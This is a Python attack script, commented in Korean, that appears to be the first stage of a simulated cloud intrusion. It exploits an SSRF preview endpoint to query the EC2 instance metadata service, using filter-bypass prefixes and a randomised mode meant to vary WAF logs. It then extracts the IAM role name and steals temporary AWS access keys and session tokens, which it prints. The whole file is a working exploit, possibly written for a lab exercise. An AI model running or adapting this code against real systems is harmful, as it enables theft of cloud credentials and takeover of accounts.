"""
Step 1 — Initial Access & Credential Access
SSRF(GET /preview?url=) 를 통해 IMDS에 접근, EC2 임시 자격증명을 탈취한다.

단독 실행:
    python step1_initial_access.py
    python step1_initial_access.py --alb-url https://xxxx.elb.amazonaws.com
"""

import argparse
import json
import logging
import random
import sys

import requests

# 같은 디렉터리에서 단독 실행할 때도 import 경로가 깨지지 않도록 설정
sys.path.insert(0, __file__.rsplit("\\", 1)[0] if "\\" in __file__ else ".")

import config
from imds_payloads import IMDS_BYPASS_PREFIXES

logging.basicConfig(level=logging.INFO, format="[%(levelname)s] %(message)s",
                    handlers=[logging.StreamHandler(stream=__import__("sys").stdout)])
log = logging.getLogger(__name__)


def _ssrf_get(webapp_url: str, target_url: str, verify_ssl: bool = True) -> requests.Response:
    """SSRF 엔드포인트를 통해 target_url의 응답을 반환한다."""
    endpoint = f"{webapp_url}{config.SSRF_PATH}"
    params = {config.SSRF_PARAM: target_url}
    resp = requests.get(endpoint, params=params, timeout=10, verify=verify_ssl)
    return resp


def _extract_text_from_response(resp: requests.Response) -> str:
    """
    app.py는 이미지가 아닌 응답을 error 필드로 HTML에 노출한다.
    응답 body에서 실제 IMDS 텍스트를 꺼낸다.
    간단히 전체 text를 반환하고 파싱은 호출 측에서 처리한다.
    """
    return resp.text


def _build_imds_url(prefix: str, path: str) -> str:
    return f"{prefix}{path}"


def _pick_candidates() -> list[tuple[str, str]]:
    """
    config.IMDS_PAYLOAD_MODE 에 따라 시도할 페이로드 목록을 반환한다.
    - "default" : 기본 페이로드(목록 첫 번째)만
    - "random"  : 목록 전체를 무작위 순서로 (WAF 로그 다양화용)
    """
    if config.IMDS_PAYLOAD_MODE == "random":
        return random.sample(IMDS_BYPASS_PREFIXES, len(IMDS_BYPASS_PREFIXES))
    return [IMDS_BYPASS_PREFIXES[0]]


def steal_role_name(webapp_url: str) -> tuple[str, str]:
    """
    IMDS /security-credentials/ 에 접근해 IAM Role 이름을 반환한다.
    Returns: (role_name, working_prefix)
    """
    candidates = _pick_candidates()
    log.info("  페이로드 모드: %s (%d개)", config.IMDS_PAYLOAD_MODE, len(candidates))

    for desc, prefix in candidates:
        imds_url = _build_imds_url(prefix, config.IMDS_CRED_PATH)
        log.info("[1-A] SSRF 시도 (%s): %s", desc, imds_url)
        try:
            resp = _ssrf_get(webapp_url, imds_url)
        except Exception as e:
            log.warning("  요청 실패: %s", e)
            continue

        # app.py는 비이미지 응답을 error 필드에 담아 HTML로 반환
        # 응답 HTTP 코드가 200(app 자체 성공)이고 내용에 role 이름이 있어야 함
        if resp.status_code not in (200, 502):
            log.warning("  HTTP %s — 건너뜀", resp.status_code)
            continue

        body = _extract_text_from_response(resp)

        # IMDS 응답은 줄바꿈으로 구분된 role 이름 목록
        # HTML 안에 섞여 있으므로 줄 단위로 파싱
        role_name = _parse_role_name(body)
        if role_name:
            log.info("  [+] IAM Role 이름 확인: %s (payload: %s)", role_name, desc)
            return role_name, prefix

        log.warning("  Role 이름 파싱 실패 (응답 일부): %.200s", body)

    raise RuntimeError("모든 IMDS 우회 페이로드 실패 — Role 이름 획득 불가")


def _extract_error_box(html_body: str) -> str | None:
    """index.html의 <div class="error-box"> 내용만 꺼낸다."""
    import re
    import html as html_lib
    match = re.search(r'<div class="error-box">(.*?)</div>', html_body, re.DOTALL)
    if not match:
        return None
    return html_lib.unescape(match.group(1)).strip()


def _parse_role_name(html_body: str) -> str | None:
    """
    error-box div 안의 IMDS 텍스트에서 role 이름을 추출한다.
    IMDS /security-credentials/ 응답은 role 이름 한 줄.
    """
    import re
    text = _extract_error_box(html_body)
    if not text:
        return None
    # 첫 번째 토큰이 IAM role 이름 형식이면 반환
    for token in text.split():
        if re.fullmatch(r"[\w+=,.@\-/]{1,64}", token):
            return token
    return None


def steal_credentials(webapp_url: str, role_name: str, prefix: str) -> dict:
    """
    IMDS /security-credentials/<role_name> 에서 임시 자격증명을 탈취한다.
    Returns: {"AccessKeyId", "SecretAccessKey", "Token", "Expiration"}
    """
    path = f"{config.IMDS_CRED_PATH}{role_name}"
    imds_url = _build_imds_url(prefix, path)
    log.info("[1-B] 자격증명 요청: %s", imds_url)

    resp = _ssrf_get(webapp_url, imds_url)
    body = _extract_text_from_response(resp)
    creds = _parse_credentials(body)
    if not creds:
        raise RuntimeError(f"자격증명 파싱 실패. 응답 일부: {body[:300]}")

    log.info("  [+] AccessKeyId : %s", creds["AccessKeyId"])
    log.info("  [+] Expiration  : %s", creds.get("Expiration", "N/A"))
    return creds


def _parse_credentials(html_body: str) -> dict | None:
    """error-box div 안의 IMDS JSON 자격증명을 파싱한다."""
    import re
    text = _extract_error_box(html_body)
    if not text:
        return None
    match = re.search(r'\{.*?"AccessKeyId".*?\}', text, re.DOTALL)
    if not match:
        return None
    try:
        data = json.loads(match.group())
        required = {"AccessKeyId", "SecretAccessKey", "Token"}
        if required.issubset(data.keys()):
            return {k: data[k] for k in ("AccessKeyId", "SecretAccessKey", "Token", "Expiration") if k in data}
    except json.JSONDecodeError:
        pass
    return None


def run(webapp_url: str | None = None) -> dict:
    """
    Step 1 전체 실행.
    Returns: {
        "role_name": str,
        "AccessKeyId": str,
        "SecretAccessKey": str,
        "Token": str,
        "Expiration": str,
    }
    """
    webapp_url = webapp_url or config.WEBAPP_URL
    log.info("=" * 60)
    log.info("Step 1: Initial Access & Credential Access")
    log.info("  Target: %s", webapp_url)
    log.info("=" * 60)

    role_name, working_prefix = steal_role_name(webapp_url)
    creds = steal_credentials(webapp_url, role_name, working_prefix)
    result = {"role_name": role_name, **creds}

    log.info("[Step 1 완료] 임시 자격증명 탈취 성공")
    return result


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Step 1: SSRF → IMDS 자격증명 탈취")
    parser.add_argument("--webapp-url",   default=None, help="웹앱 URL (기본: config.WEBAPP_URL)")
    parser.add_argument("--payload-mode", default=None, choices=["default", "random"],
                        help="IMDS 페이로드 모드 (기본: config.IMDS_PAYLOAD_MODE)")
    args = parser.parse_args()

    if args.payload_mode:
        config.IMDS_PAYLOAD_MODE = args.payload_mode

    result = run(webapp_url=args.webapp_url)
    print("\n[결과]")
    print(json.dumps(result, indent=2, ensure_ascii=False))
